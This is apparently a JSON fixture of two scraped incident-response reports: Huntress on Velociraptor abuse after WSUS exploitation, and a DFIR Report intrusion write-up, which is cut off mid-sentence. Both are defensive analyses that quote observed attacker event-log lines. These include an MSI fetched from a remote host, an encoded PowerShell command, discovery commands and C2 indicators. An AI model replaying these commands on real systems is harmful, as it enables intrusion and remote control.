[
  {
    "url": "https://www.huntress.com/blog/velociraptor-misuse-part-one-wsus-up",
    "title": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress",
    "content": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress Huntress Acquires Inside Agent: A New Era for Identity Protection Portal Login Support Contact Search Search Products Products Platform Overview Managed EDR Get full endpoint visibility, detection, and response Managed EDR Get full endpoint visibility, detection, and response Managed ITDR Protect your Microsoft 365 identities and email environments. Managed ITDR Protect your Microsoft 365 identities and email environments. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Integrations Integrations Support Documentation Support Documentation See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Book a Demo See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Solutions Solutions Threats We Stop Phishing Phishing Business Email Compromise Business Email Compromise Ransomware Ransomware View All View All Industries We Serve Education Education Financial Services Financial Services State and Local Government State and Local Government Healthcare Healthcare Law Firms Law Firms Manufacturing Manufacturing Utilities Utilities View All View All Tailored Solutions MSPs MSPs Resellers Resellers SMBs SMBs Compliance Compliance Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Pricing Resources Resources Community Series The Product Lab Shape the next big thing in cybersecurity together. The Product Lab Shape the next big thing in cybersecurity together. Fireside Chat Real people. Real perspectives. Better conversations. Fireside Chat Real people. Real perspectives. Better conversations. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Resources Upcoming Events Upcoming Events eBooks eBooks On-Demand Webinars On-Demand Webinars Videos Videos Whitepapers Whitepapers Datasheets Datasheets Cybersecurity Education Cybersecurity 101 Cybersecurity 101 Cybersecurity Guides Cybersecurity Guides Threat Library Threat Library Real Tradecraft, Real Results Real Tradecraft, Real Results The Huntress Blog Huntress Lands on the Microsoft Marketplace Huntress Lands on the Microsoft Marketplace How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep Live Hacking Into Microsoft 365 with Kyle Hanslovan Live Hacking Into Microsoft 365 with Kyle Hanslovan Why Huntress Why Huntress Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs The Huntress SOC 24/7 Security Operations Center The Huntress SOC 24/7 Security Operations Center Reviews Why businesses of all sizes trust Huntress to defend their assets Reviews Why businesses of all sizes trust Huntress to defend their assets Case Studies Learn directly from our partners how Huntress has helped them Case Studies Learn directly from our partners how Huntress has helped them Community Get in touch with the Huntress Community team Community Get in touch with the Huntress Community team Compare Huntress Bitdefender Bitdefender Blackpoint Blackpoint Breach Secure Now! Breach Secure Now! Crowdstrike Crowdstrike Datto Datto SentinelOne SentinelOne Sophos Sophos Compare All Compare All Partners Partners HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. Partner Portal Login HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. MSPs Join our partner community to deliver expert-led managed security. MSPs Join our partner community to deliver expert-led managed security. Resellers Partner program designed to grow your cybersecurity business. Resellers Partner program designed to grow your cybersecurity business. Company Company Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Our Story We're on a mission to shatter the barriers to enterprise-level security. Our Story We're on a mission to shatter the barriers to enterprise-level security. Newsroom Explore press releases, news articles, media interviews and more. Newsroom Explore press releases, news articles, media interviews and more. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Careers Ready to shake up the cybersecurity world? Join the hunt. Careers Ready to shake up the cybersecurity world? Join the hunt. Awards Awards Contact Us Contact Us Portal Login Support Contact Search Get a Demo Free Trial Portal Login Support Contact Search Search Get a Demo Free Trial Home Blog Velociraptor Misuse, Pt. I: WSUS-Up? Published: November 20, 2025 Velociraptor Misuse, Pt. I: WSUS-Up? By: Lindsey O'Donnell-Welch Harlan Carvey Acknowledgments: Special thanks to Ben Folland for his contributions to this investigation and writeup. In November, Huntress analysts detected an incident where threat actors likely exploited a recently patched remote code execution vulnerability in Windows Server Update Services (WSUS). After gaining initial access via exploitation of the flaw (CVE-2025-59287), the actors then installed Velociraptor, a legitimate, open source tool, which was used for C2 of the endpoint. Velociraptor is a digital forensics and incident response (DFIR) tool that enables teams to quickly collect and analyze artifacts from across a network, giving them a better understanding of security incidents. Threat actors have been abusing the tool in attacks, specifically to set up communications back to command-and-control (C2) servers. The Huntress Security Operations Center (SOC) first observed the misuse of Velociraptor during November 2024. However, more recently in 2025 there\u2019s been a significant uptick in the past three months of incidents involving the use of the Velociraptor to facilitate remote access into the compromised endpoint. In part one of this two-part series, we will break down a recent incident we observed where threat actors exploited WSUS before deploying Velociraptor. In part two, we will discuss the evolution of incidents over the past few months we\u2019ve seen that abuse the tool. WSUS exploitation On November 12, 2025, we observed the deployment of Velociraptor by threat actors after they had gained initial access through exploitation of a flaw in WSUS (Microsoft\u2019s centralized update distribution service for IT administrators). This deserialization issue has previously been exploited by threat actors targeting vulnerable WSUS instances exposed publicly on their default ports; as of October 23, a patch is available from Microsoft. The exploitation of WSUS is interesting when compared to previous incidents that have involved Velociraptor. Other researchers have recently publicly documented how threat actors are abusing the tool in attacks. For example, the Cisco Talos team in October found Velociraptor activity that they attributed with medium confidence to Storm-2603. While the researchers did not observe the actor\u2019s initial access in this incident, they said the vector was likely attributed to SharePoint vulnerabilities known as ToolShell, due to the impacted organization\u2019s exposure to ToolShell and the link to Storm-2603. In the incident we saw, the Windows Event Log shows the threat actor compromising WSUSService.exe before running the Windows installer (as seen via a Service Control Manager/7036 message stating Windows Installer,running ) and then installing a malicious MSI package from s3[.]wasabisys[.]com . Figure 1 illustrates the results of searching for the domain on VirusTotal. Figure 1: VirusTotal search for the domain wasabisys[.]com linked to the malicious MSI package As seen in the Windows Event Log records below, the threat actor then installed Velociraptor, which was configured to communicate with the endpoint update[.]githubtestbak[.]workers[.]dev . MsiInstaller/1040;https://s3.wasabisys.com/kiessler/v4.msi,3348,(NULL),(NULL),(NULL),(NULL), Service Control Manager/7045;Velociraptor Service,\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\" --config \"C:\\Program Files\\Velociraptor\\/client.config.yaml\" service run ,user mode service,auto start,LocalSystem Service Control Manager/7036;Velociraptor Service,running Velociraptor/1;Starting service Velociraptor MsiInstaller/11707;Product: Velociraptor -- Installation completed successfully.,(NULL),(NULL),(NULL),(NULL),(NULL), Velociraptor was installed via the following binary path: Velociraptor/1000;\"Velociraptor startup ARGV: [\"\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\"\",\"\"--config\"\",\"\"C:\\Program Files\\Velociraptor\\/client.config.yaml\"\",\"\"service\"\",\"\"run\"\"],\" During the investigation into the incident, we found that even though the first attempt to install Velociraptor succeeded, there were two more subsequent attempts to run the same command to install the open source tool from the same location. After the threat actor installed Velociraptor, we observed a number of base64-encoded PowerShell commands, which were child processes of Velociraptor.exe, such as the following: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA== Each of the observed PowerShell commands varied only in the encoded commands; the command line switches and their positions in the command line were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"C:\\Windows\\system32\\net.exe\" group \"domain computers\" /do \"C:\\Windows\\system32\\quser.exe\" \"C:\\Windows\\system32\\setspn.exe\" -Q VeeamBackupSVC/* \"C:\\Windows\\system32\\ipconfig.exe\" /al Figure 2: EDR signals showing the threat actor installing an MSI package, running Velociraptor, and performing discovery commands At this point, the threat actor\u2019s activity was contained by Huntress SOC analysts. Conclusion Velociraptor is only the latest legitimate tool that threat actors are abusing. While this is specifically for incident response, many of the tools that have previously been misused in attacks include dual-use penetration testing frameworks, such as Cobalt Strike, Mimikatz, Metasploit, and PowerSploit, as highlighted in the Huntress 2025 Cyber Threat Report . We\u2019ve seen threat actors use legitimate tools long enough to know that Velociraptor won\u2019t be the first dual-use, open-source tool that will pop up in attacks - nor will it be the last. However, by closely tracking the behavior in incidents that involve Velociraptor, we can get a better understanding of how threat actors are deploying these tools in victim environments. Huntress has seen Velociraptor in a number of other incidents over the past few months. For an additional deep view and insights into the misuse of the tool, stay tuned for part 2 of this blog series. Indicators of Compromise (IOCs) Item Description s3[.]wasabisys[.]com Domain from which MSI package was retrieved update[.]githubtestbak[.]workers[.]dev Velociraptor C2 Categories Cybersecurity Education Summarize this post ChatGPT Claude Perplexity Google AI See Huntress in action Our platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC). Book a Demo Share You Might Also Like CMMC Final Rule: What DoD Subs Need to Know The DoD's CMMC final rule is here. Learn what it means for subcontractors, the new timeline, and how to prepare for your Level 2 audit to stay competitive. Learn More #ShadyHacks with Kyle Hanslovan Learn More The Best Way to Prepare for the Worst: Incident Response Planning for Decision Makers Learn More Sign Up for Huntress Updates Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Work Email* Privacy \u2022 Terms Submit By submitting this form, you accept our Terms of Service & Privacy Policy Thank you! Your submission has been received! Oops! Something went wrong while submitting the form. Platform Huntress Managed Security Platform Managed EDR Managed EDR for macOS Managed EDR for Linux Managed ITDR Managed SIEM Managed Security Awareness Training Book a Demo Solutions Phishing Compliance Business Email Compromise Education Finance Healthcare Manufacturing State & Local Government Why Huntress? Managed Service Providers Resellers IT & Security Teams 24/7 SOC Case Studies Resources Blog Resource Center Cybersecurity 101 Upcoming Events Support Documentation About Our Company Leadership News & Press Careers Contact Us Protecting 215k+ customers like you with enterprise-grade protection. Privacy Policy Cookie Policy Terms of Use Cookie Consent \u00a9 2025 Huntress All Rights Reserved. Join the Hunt Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Email Sign Up By submitting this form, you accept our Terms of Service & Privacy Policy",
    "filtered_content": "Velociraptor WSUS Exploitation, Pt. I: WSUS-Up? | Huntress Huntress Acquires Inside Agent: A New Era for Identity Protection Portal Login Support Contact Search Search Products Products Platform Overview Managed EDR Get full endpoint visibility, detection, and response Managed EDR Get full endpoint visibility, detection, and response Managed ITDR Protect your Microsoft 365 identities and email environments. Managed ITDR Protect your Microsoft 365 identities and email environments. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed SIEM Managed threat response and robust compliance support at a predictable price. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Managed Security Awareness Training Empower your teams with science-backed security awareness training. Integrations Integrations Support Documentation Support Documentation See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Book a Demo See Huntress in Action Quickly deploy and manage real-time protection for endpoints, email, and employees - all from a single dashboard. Solutions Solutions Threats We Stop Phishing Phishing Business Email Compromise Business Email Compromise Ransomware Ransomware View All View All Industries We Serve Education Education Financial Services Financial Services State and Local Government State and Local Government Healthcare Healthcare Law Firms Law Firms Manufacturing Manufacturing Utilities Utilities View All View All Tailored Solutions MSPs MSPs Resellers Resellers SMBs SMBs Compliance Compliance Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Healthcare Cybersecurity Success Kit Everything you need to keep your patients safe and your organization running smoothly. Pricing Resources Resources Community Series The Product Lab Shape the next big thing in cybersecurity together. The Product Lab Shape the next big thing in cybersecurity together. Fireside Chat Real people. Real perspectives. Better conversations. Fireside Chat Real people. Real perspectives. Better conversations. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Tradecraft Tuesday No products, no pitches \u2013 just tradecraft. Resources Upcoming Events Upcoming Events eBooks eBooks On-Demand Webinars On-Demand Webinars Videos Videos Whitepapers Whitepapers Datasheets Datasheets Cybersecurity Education Cybersecurity 101 Cybersecurity 101 Cybersecurity Guides Cybersecurity Guides Threat Library Threat Library Real Tradecraft, Real Results Real Tradecraft, Real Results The Huntress Blog Huntress Lands on the Microsoft Marketplace Huntress Lands on the Microsoft Marketplace How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep How Huntress & DEFCERT Are Streamlining CMMC Assessment Prep Live Hacking Into Microsoft 365 with Kyle Hanslovan Live Hacking Into Microsoft 365 with Kyle Hanslovan Why Huntress Why Huntress Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs Why Huntress Go beyond AI in the fight against today\u2019s hackers with Huntress Managed EDR purpose-built for your needs The Huntress SOC 24/7 Security Operations Center The Huntress SOC 24/7 Security Operations Center Reviews Why businesses of all sizes trust Huntress to defend their assets Reviews Why businesses of all sizes trust Huntress to defend their assets Case Studies Learn directly from our partners how Huntress has helped them Case Studies Learn directly from our partners how Huntress has helped them Community Get in touch with the Huntress Community team Community Get in touch with the Huntress Community team Compare Huntress Bitdefender Bitdefender Blackpoint Blackpoint Breach Secure Now! Breach Secure Now! Crowdstrike Crowdstrike Datto Datto SentinelOne SentinelOne Sophos Sophos Compare All Compare All Partners Partners HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. Partner Portal Login HUNTRESS HUB Login to access top-notch marketing resources, tools, and training. MSPs Join our partner community to deliver expert-led managed security. MSPs Join our partner community to deliver expert-led managed security. Resellers Partner program designed to grow your cybersecurity business. Resellers Partner program designed to grow your cybersecurity business. Company Company Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Press Release Huntress Announces Collaboration with Microsoft to Strengthen Cybersecurity for Businesses of All Sizes Our Story We're on a mission to shatter the barriers to enterprise-level security. Our Story We're on a mission to shatter the barriers to enterprise-level security. Newsroom Explore press releases, news articles, media interviews and more. Newsroom Explore press releases, news articles, media interviews and more. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Meet the Team Founded by former NSA Cyber Operators. Backed by security researchers. Careers Ready to shake up the cybersecurity world? Join the hunt. Careers Ready to shake up the cybersecurity world? Join the hunt. Awards Awards Contact Us Contact Us Portal Login Support Contact Search Get a Demo Free Trial Portal Login Support Contact Search Search Get a Demo Free Trial Home Blog Velociraptor Misuse, Pt. I: WSUS-Up? Published: November 20, 2025 Velociraptor Misuse, Pt. I: WSUS-Up? By: Lindsey O'Donnell-Welch Harlan Carvey Acknowledgments: Special thanks to Ben Folland for his contributions to this investigation and writeup. In November, Huntress analysts detected an incident where threat actors likely exploited a recently patched remote code execution vulnerability in Windows Server Update Services (WSUS). After gaining initial access via exploitation of the flaw (CVE-2025-59287), the actors then installed Velociraptor, a legitimate, open source tool, which was used for C2 of the endpoint. Velociraptor is a digital forensics and incident response (DFIR) tool that enables teams to quickly collect and analyze artifacts from across a network, giving them a better understanding of security incidents. Threat actors have been abusing the tool in attacks, specifically to set up communications back to command-and-control (C2) servers. The Huntress Security Operations Center (SOC) first observed the misuse of Velociraptor during November 2024. However, more recently in 2025 there\u2019s been a significant uptick in the past three months of incidents involving the use of the Velociraptor to facilitate remote access into the compromised endpoint. In part one of this two-part series, we will break down a recent incident we observed where threat actors exploited WSUS before deploying Velociraptor. In part two, we will discuss the evolution of incidents over the past few months we\u2019ve seen that abuse the tool. WSUS exploitation On November 12, 2025, we observed the deployment of Velociraptor by threat actors after they had gained initial access through exploitation of a flaw in WSUS (Microsoft\u2019s centralized update distribution service for IT administrators). This deserialization issue has previously been exploited by threat actors targeting vulnerable WSUS instances exposed publicly on their default ports; as of October 23, a patch is available from Microsoft. The exploitation of WSUS is interesting when compared to previous incidents that have involved Velociraptor. Other researchers have recently publicly documented how threat actors are abusing the tool in attacks. For example, the Cisco Talos team in October found Velociraptor activity that they attributed with medium confidence to Storm-2603. While the researchers did not observe the actor\u2019s initial access in this incident, they said the vector was likely attributed to SharePoint vulnerabilities known as ToolShell, due to the impacted organization\u2019s exposure to ToolShell and the link to Storm-2603. In the incident we saw, the Windows Event Log shows the threat actor compromising WSUSService.exe before running the Windows installer (as seen via a Service Control Manager/7036 message stating Windows Installer,running ) and then installing a malicious MSI package from s3[.]wasabisys[.]com . Figure 1 illustrates the results of searching for the domain on VirusTotal. Figure 1: VirusTotal search for the domain wasabisys[.]com linked to the malicious MSI package As seen in the Windows Event Log records below, the threat actor then installed Velociraptor, which was configured to communicate with the endpoint update[.]githubtestbak[.]workers[.]dev . MsiInstaller/1040;https://s3.wasabisys.com/kiessler/v4.msi,3348,(NULL),(NULL),(NULL),(NULL), Service Control Manager/7045;Velociraptor Service,\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\" --config \"C:\\Program Files\\Velociraptor\\/client.config.yaml\" service run ,user mode service,auto start,LocalSystem Service Control Manager/7036;Velociraptor Service,running Velociraptor/1;Starting service Velociraptor MsiInstaller/11707;Product: Velociraptor -- Installation completed successfully.,(NULL),(NULL),(NULL),(NULL),(NULL), Velociraptor was installed via the following binary path: Velociraptor/1000;\"Velociraptor startup ARGV: [\"\"C:\\Program Files\\Velociraptor\\Velociraptor.exe\"\",\"\"--config\"\",\"\"C:\\Program Files\\Velociraptor\\/client.config.yaml\"\",\"\"service\"\",\"\"run\"\"],\" During the investigation into the incident, we found that even though the first attempt to install Velociraptor succeeded, there were two more subsequent attempts to run the same command to install the open source tool from the same location. After the threat actor installed Velociraptor, we observed a number of base64-encoded PowerShell commands, which were child processes of Velociraptor.exe, such as the following: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Unrestricted -encodedCommand cQB1AHMAZQByAA== Each of the observed PowerShell commands varied only in the encoded commands; the command line switches and their positions in the command line were consistent across all commands. These commands launched a series of discovery queries, allowing the threat actor to gather information about users, running services, configurations, and more. \"C:\\Windows\\system32\\net.exe\" group \"domain computers\" /do \"C:\\Windows\\system32\\quser.exe\" \"C:\\Windows\\system32\\setspn.exe\" -Q VeeamBackupSVC/* \"C:\\Windows\\system32\\ipconfig.exe\" /al Figure 2: EDR signals showing the threat actor installing an MSI package, running Velociraptor, and performing discovery commands At this point, the threat actor\u2019s activity was contained by Huntress SOC analysts. Conclusion Velociraptor is only the latest legitimate tool that threat actors are abusing. While this is specifically for incident response, many of the tools that have previously been misused in attacks include dual-use penetration testing frameworks, such as Cobalt Strike, Mimikatz, Metasploit, and PowerSploit, as highlighted in the Huntress 2025 Cyber Threat Report . We\u2019ve seen threat actors use legitimate tools long enough to know that Velociraptor won\u2019t be the first dual-use, open-source tool that will pop up in attacks - nor will it be the last. However, by closely tracking the behavior in incidents that involve Velociraptor, we can get a better understanding of how threat actors are deploying these tools in victim environments. Huntress has seen Velociraptor in a number of other incidents over the past few months. For an additional deep view and insights into the misuse of the tool, stay tuned for part 2 of this blog series. Indicators of Compromise (IOCs) Item Description s3[.]wasabisys[.]com Domain from which MSI package was retrieved update[.]githubtestbak[.]workers[.]dev Velociraptor C2 Categories Cybersecurity Education Summarize this post ChatGPT Claude Perplexity Google AI See Huntress in action Our platform combines a suite of powerful managed detection and response tools for endpoints and Microsoft 365 identities, science-backed security awareness training, and the expertise of our 24/7 Security Operations Center (SOC). Book a Demo Share You Might Also Like CMMC Final Rule: What DoD Subs Need to Know The DoD's CMMC final rule is here. Learn what it means for subcontractors, the new timeline, and how to prepare for your Level 2 audit to stay competitive. Learn More #ShadyHacks with Kyle Hanslovan Learn More The Best Way to Prepare for the Worst: Incident Response Planning for Decision Makers Learn More Sign Up for Huntress Updates Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Work Email* Privacy \u2022 Terms Submit By submitting this form, you accept our Terms of Service & Privacy Policy Thank you! Your submission has been received! Oops! Something went wrong while submitting the form. Platform Huntress Managed Security Platform Managed EDR Managed EDR for macOS Managed EDR for Linux Managed ITDR Managed SIEM Managed Security Awareness Training Book a Demo Solutions Phishing Compliance Business Email Compromise Education Finance Healthcare Manufacturing State & Local Government Why Huntress? Managed Service Providers Resellers IT & Security Teams 24/7 SOC Case Studies Resources Blog Resource Center Cybersecurity 101 Upcoming Events Support Documentation About Our Company Leadership News & Press Careers Contact Us Protecting 215k+ customers like you with enterprise-grade protection. Privacy Policy Cookie Policy Terms of Use Cookie Consent \u00a9 2025 Huntress All Rights Reserved. Join the Hunt Get insider access to Huntress tradecraft, killer events, and the freshest blog updates. Email Sign Up By submitting this form, you accept our Terms of Service & Privacy Policy",
    "expected_count": 2
  },
  {
    "url": "https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/",
    "title": "Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs \u2013 The DFIR Report",
    "content": "Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts dragonforce play ransomhub sectoprat Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs September 8, 2025 Key Takeaways The intrusion began when a user downloaded and executed a malicious file impersonating DeskSoft\u2019s EarthTime application but instead dropped SectopRAT malware. The threat actor deployed multiple malware families, including SystemBC for proxy tunneling, and later Betruger backdoor for additional capabilities. They leveraged various tools such as AdFind, SharpHound, SoftPerfect NetScan, and GT_NET.exe (Grixba) to map out the environment and perform reconnaissance activities. Lateral movement was primarily accomplished through RDP connections, with additional use of Impacket\u2019s wmiexec. The threat actor moved across multiple systems, including domain controllers, backup servers, and file servers, while maintaining persistence through local account creation and startup folder shortcuts. Data collection and exfiltration were performed using WinRAR to compress targeted file shares containing sensitive business documents, which were then transferred via WinSCP to an FTP server hosted by a cloud provider in clear text. The discovery of Grixba (a reconnaissance tool linked to Play ransomware), a previous NetScan output containing data from a company reportedly compromised by DragonForce ransomware, and the use of the Betruger backdoor suggest that the likely objective of this intrusion was ransomware deployment. Based on these findings, the threat actor behind this intrusion was most likely an affiliate operating across multiple ransomware groups. This case was originally published as a Threat Brief to customers in March of 2025. Interested in pricing or have questions about our services? Contact us The DFIR Report Services Private Threat Briefs : 20+ private DFIR reports annually. Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc. All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel. Private Sigma Ruleset : Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples. DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds. Contact us today for pricing or a demo! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary The intrusion began in September 2024 with a download of a malicious file mimicking the EarthTime application by DeskSoft. Upon execution, SectopRAT was deployed which opened a connection to its command and control (C2) infrastructure. The threat actor established persistence by relocating the malicious file and placing a shortcut in the Startup folder, configured to trigger on user logon. They further elevated access by creating a new local account and assigning it local administrative privileges. Soon after establishing the initial access, the malware deployed SystemBC. They then accessed the beachhead host via RDP using the newly created local account and executed discovery commands. At this stage, the threat actor completed a DCSync attack against a domain controller. They then followed up by connecting to the domain controller over RDP with the built-in Administrator account and used PsExec to execute SystemBC with SYSTEM privileges on the host. Using their existing proxy tunnel, the threat actor once again used RDP to connect to hosts in the environment. While on the domain controller, we observed the threat actor using Windows utilities, such as ipconfig and nltest, to perform an enumeration. Over the next few hours, the threat actor connected to several servers using RDP and deployed SystemBC across the environment. On a backup server, they executed a PowerShell script designed to retrieve Veeam credentials. On the second day, the threat actor used RDP to move laterally to the file server where they dropped a WinRAR executable and archived specific file shares. They transferred the resulting archives to a U.S. based cloud host over unencrypted FTP using WinSCP. This enabled the retrieval of credentials, among other details, during traffic analysis. The threat actor also resumed discovery activity with the use of Grixba, a tool associated with Play Ransomware that uses WMI and WinRM to discover users and systems across the network, which was executed from both the domain controller and a backup server. They carried out further discovery activity with the use of AdFind for AD queries, PowerShell Cmdlets to collect host data, SharpHound for directory mapping, and SoftPerfect NetScan to scan remote hosts. On the sixth day of the intrusion, SectopRAT spawned a new payload on the beachhead host. The new payload executed was Betruger, a multi-function backdoor. The threat actor also used wmiexec to enumerate remote hosts through various reconnaissance commands executed on the domain controller. Throughout the intrusion, the threat actor used multiple defense evasion techniques, including process injection, timestomping, disabling Microsoft Defender\u2019s protections, and deploying binaries with spoofed metadata to disguise themselves as legitimate cybersecurity tools such as SentinelOne and Avast Antivirus. While no final actions were observed during this intrusion before the threat actor was evicted, the evidence shows links to three different ransomware operations. The Grixba tooling has been associated with the Play ransomware group. Similarly the Betruger backdoor has been linked to Ransomhub affiliated threat actors. And finally with opsec failures, the threat actor dropped the results of prior netscan discovery that appeared to contain data from a company that had been posted to the DragonForce Ransomware leak site prior in 2024. With each of these indicators we assess this threat actor was active as an affiliate for multiple ransomware groups. Analysts Analysis and reporting completed by r3nzsec , EncapsulateJ , rkonicekr , and Adam Rowe . Initial Access The intrusion began when a user downloaded and executed an executable impersonating DeskSoft\u2019s EarthTime application. This binary initiated a chain of execution leading to the deployment of SecTopRat, a .NET-based remote access trojan (RAT) with information-stealing capabilities. While investigating the connection between this malware and the legitimate software, we identified a vulnerability in the installer. Although we did not observe the threat actor exploiting this flaw, it may explain why the software was targeted. The EarthTime application has a list of resource files that it will copy into its install location. This includes the EarthTime.exe executable file. When the installer is run, before it unpacks the resources from inside the installer package, It first looks for these resources in the current directory: Meaning that if any of the files listed in the resource are found, it will copy that file instead of the one packaged in the installer. For example, we created our own Cities.txt file, and on installation, we confirmed our modified file was copied to the installed location: This behavior matches CWE-427 \u2013 Uncontrolled Search Path Element ( https://cwe.mitre.org/data/definitions/427.html ) We discovered that this vulnerability applies to all software provided by Desksoft. Execution EarthTime.exe The EarthTime.exe binary was executed from the Downloads folder. The parent process was explorer.exe, suggesting it was executed by the victim clicking on the executable. EarthTime.exe appeared to be mimicking the legitimate EarthTime application by DeskSoft. The real EarthTime is a world clock utility that lets users track multiple time zones and view astronomical data like sunrise and sunset times for different locations. It\u2019s particularly useful for business users and travelers who need to coordinate across time zones. This malicious version had been signed with a revoked certificate from \u201cBrave Pragmatic Network Technology Co., Ltd.\u201d \u2013 likely an attempt to make it look legitimate to both users and security software. Brave Pragmatic Network Technology Co., Ltd. appears to be a compromised or fraudulent certificate authority that has been observed signing multiple malware samples, with security researchers tracking various malicious executables bearing certificates from this entity. According to Cert Central lookup database , Brave Pragmatic Network Technology Co., Ltd. is a known malicious signer that has been observed signing SectopRAT samples, with certificates issued by GlobalSign GCC R45 EV CodeSigning CA 2020 and traced to China (CN). The choice to impersonate EarthTime makes sense from the threat actor\u2019s perspective, as people are generally more willing to run software they recognize. A file named \u201cEarthTime.exe\u201d is far less suspicious than something with a random or obviously malicious name, making this a classic example of social engineering through software masquerading. At the time of writing, the binary is widely recognized as malicious : EarthTime.exe spawned cmd.exe with no command line arguments. This cmd.exe process went on to spawn MSBuild.exe with the CurrentDirectory set to the user\u2019s downloads folder. MSBuild.exe is a legitimate binary signed by Microsoft, but it is unusual for it to be executed with no command-line arguments. Red Canary has previously observed this activity linked to the SecTopRAT/ArechClient2, a .NET RAT tool, which also inspired the following threat hunting query , which would detect this activity. Process chains where SecTopRat/ArechClient2 has been injected into both cmd.exe and a subsequent msbuild.exe child process have been commonly observed, such as by Red Canary and The DFIR Report . After injection, the malicious MSBuild.exe process reached out to Pastebin to retrieve its C2 configuration. MSBuild.exe communicated with 45.141.87.55 on ports 9000 and 15647. This traffic triggered the following Suricata rules: This SectopRAT IP address was also mentioned by Fox_threatintel on X/Twitter last year (2024) while also mentioning port 9000 The same IP address was listed in the IOC section of RussianPanda\u2019s blog detailing The abuse of ITarian RMM by the Dolphin Loader, a malware delivery mechanism that leverages legitimate remote management tools to deploy RATs like SectopRAT. This MSBuild.exe process then wrote the malicious executable C:\\Users\\Public\\Music\\WakeWordEngine.dll . This file write event triggered the following Sigma rules: \u2022 \u2018Suspicious Binaries and Scripts in Public Folder\u2019 \u2022 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 WakeWordEngine.dll | conhost.dll WakeWordEngine.dll is widely recognized as malicious at the time of writing. VirusTotal recognizes the file as conhost.dll : In-memory YARA scans identified the DLL as SystemBC, triggering the following signatures: Rule: ELASTIC_Windows_Trojan_Systembc_C1B58C2F Rule: EXT_MAL_SystemBC_Mar22_1 Rule: MALPEDIA_Win_Systembc_Auto Rule: TELEKOM_SECURITY_Win_Systembc_20220311 This DLL was deployed across multiple compromised servers throughout the intrusion. In most instances, it retained the same filename observed on the initial beachhead system (WakeWordEngine.dll); however, on the domain controller it was renamed to conhost.dll which corresponds to the filename identified in VirusTotal analysis. Across all infected systems, the malware was consistently staged in the 